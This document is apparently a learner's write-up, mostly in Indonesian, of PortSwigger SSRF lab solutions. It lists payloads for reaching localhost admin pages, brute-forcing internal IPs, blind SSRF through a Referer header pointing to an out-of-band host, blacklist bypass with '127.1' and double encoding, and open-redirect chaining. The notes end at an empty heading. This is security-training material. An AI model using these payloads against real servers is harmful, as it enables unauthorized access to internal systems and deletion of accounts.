### Basic SSRF against the local server

**Payload** : `http://localhost/admin/delete?username=carlos`
**Penjelasan** : pada server yang seharusnya melakukan request pada checkStock, diganti ke fitur halaman admin

### Basic SSRF against another back-end system

**Payload** : `http://192.168.0.$3$:8080/admin`
**Penjelasan** : Dengan melakukan brute pada ip yang memungkinkan ip yang memiliki page admin dengan bantuan intruder burpsuite

### Blind SSRF with out-of-band detection
**Payload** :
```http
GET /product?productId=1 HTTP/2
Host: 0aa6008f04083af280b0679b002100e2.web-security-academy.net
Cookie: session=VbL2dsdvUMZiHs4IeZ78j9Oa5Pk2KUMD
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xqrfzgwqsghpiys0dggsl39yvp1gpadz.oastify.com/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
It's like backend will send request to URL based on Referer to check product, then we change the URL of Referer

### SSRF with blacklist-based input filter

**Payload** : `http://127.1/%2561dmin/delete?username=carlos`
**Penjelasan** : [PortSwigger](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost)
alamat `127.1` sama dengan `127.0.0.1` dan mencoba untuk double encoding huruf a

### SSRF with filter bypass via open redirection vulnerability

**Payload** : `stockApi=%2Fproduct%2FnextProduct?%26path=http://192.168.0.12:8080/admin/delete?username=carlos
**Penjelasan** : karena pada halaman detail item, terdapat fitur next Item, dimana untuk menuju ke next item, perlu menggunakan path nextProduct, dan bisa memanfaatkan open redirect

### SSRF to retrieve NetNTLM hashes

